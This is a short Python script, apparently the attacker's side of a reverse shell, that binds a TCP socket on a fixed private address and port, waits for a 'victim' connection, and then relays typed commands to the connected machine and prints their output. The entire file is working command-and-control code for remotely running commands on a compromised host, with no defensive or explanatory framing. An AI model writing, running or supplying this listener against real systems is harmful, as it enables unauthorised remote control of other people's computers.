import socket

def create_socket():
    hacker_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    ip,port = "10.72.252.97", 8081
    socket_address=(ip,port)
    hacker_socket.bind(socket_address)
    hacker_socket.listen(5)

    return hacker_socket

def start_connection(hacker_socket:socket.socket):
    print("[+] Listening for victim connections.")
    hacker_listener_socket, client_address = hacker_socket.accept()
    return hacker_listener_socket

def transmit_commands(hacker_socket:socket.socket):
    connection_socket = start_connection(hacker_socket)
    try:
        while True:
            command = input("[+] Enter Command:")
            connection_socket.send(command.encode("utf-8"))
            command_result = connection_socket.recv(1048)
            print(command_result.decode("utf-8"))
    except KeyboardInterrupt:
        print("\n[-] Ctrl+C detected.")
        connection_socket.close()
        print("[+] Connection to victim closed.")
    except socket.error as e:
        print("Socket error number: ", e.errno)
        connection_socket.close()
    except:
        connection_socket.close()

def main():
    hacker_socket = create_socket()
    transmit_commands(hacker_socket)
    

if __name__ == "__main__":
    main()